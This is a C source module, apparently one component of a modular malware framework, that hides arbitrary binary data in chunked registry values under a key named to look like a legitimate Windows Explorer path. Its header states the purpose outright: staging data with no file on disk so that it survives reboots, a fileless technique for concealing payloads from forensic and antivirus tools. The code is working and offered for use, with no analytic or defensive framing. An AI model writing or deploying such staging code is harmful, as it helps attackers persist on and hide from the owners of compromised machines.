// chunk: core/stage_registry
// depends: (none)
// provides: stage_write, stage_read, stage_clear
// headers: windows.h
// note: Stage data in registry values — no file on disk, survives reboots

#ifndef CHUNK_STAGE_REGISTRY
#define CHUNK_STAGE_REGISTRY

#define STAGE_KEY "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SessionInfo"
#define STAGE_CHUNK_SZ 16000

static int stage_write(const char *name, const char *data, int len) {
    HKEY hk;
    DWORD disp;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, STAGE_KEY, 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hk, &disp) != ERROR_SUCCESS)
        return 0;

    int chunks = (len + STAGE_CHUNK_SZ - 1) / STAGE_CHUNK_SZ;
    for (int i = 0; i < chunks; i++) {
        char val_name[128];
        snprintf(val_name, sizeof(val_name), "%s_%04d", name, i);
        int off = i * STAGE_CHUNK_SZ;
        int n = (len - off < STAGE_CHUNK_SZ) ? len - off : STAGE_CHUNK_SZ;
        RegSetValueExA(hk, val_name, 0, REG_BINARY,
                       (const BYTE *)(data + off), (DWORD)n);
    }

    char count_name[128];
    snprintf(count_name, sizeof(count_name), "%s_cnt", name);
    RegSetValueExA(hk, count_name, 0, REG_DWORD,
                   (BYTE *)&chunks, sizeof(DWORD));

    RegCloseKey(hk);
    return len;
}

static int stage_read(const char *name, char *buf, int buf_sz) {
    HKEY hk;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, STAGE_KEY, 0, KEY_READ, &hk) != ERROR_SUCCESS)
        return 0;

    DWORD chunks = 0, sz = sizeof(DWORD);
    char count_name[128];
    snprintf(count_name, sizeof(count_name), "%s_cnt", name);
    if (RegQueryValueExA(hk, count_name, NULL, NULL, (BYTE *)&chunks, &sz) != ERROR_SUCCESS) {
        RegCloseKey(hk);
        return 0;
    }

    int total = 0;
    for (DWORD i = 0; i < chunks && total < buf_sz; i++) {
        char val_name[128];
        snprintf(val_name, sizeof(val_name), "%s_%04d", name, (int)i);
        DWORD val_sz = (DWORD)(buf_sz - total);
        if (RegQueryValueExA(hk, val_name, NULL, NULL,
                             (BYTE *)(buf + total), &val_sz) == ERROR_SUCCESS)
            total += (int)val_sz;
    }

    RegCloseKey(hk);
    return total;
}

static void stage_clear(const char *name) {
    HKEY hk;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, STAGE_KEY, 0, KEY_SET_VALUE | KEY_READ, &hk) != ERROR_SUCCESS)
        return;

    DWORD chunks = 0, sz = sizeof(DWORD);
    char count_name[128];
    snprintf(count_name, sizeof(count_name), "%s_cnt", name);
    RegQueryValueExA(hk, count_name, NULL, NULL, (BYTE *)&chunks, &sz);

    for (DWORD i = 0; i < chunks; i++) {
        char val_name[128];
        snprintf(val_name, sizeof(val_name), "%s_%04d", name, (int)i);
        RegDeleteValueA(hk, val_name);
    }
    RegDeleteValueA(hk, count_name);
    RegCloseKey(hk);
}

#endif
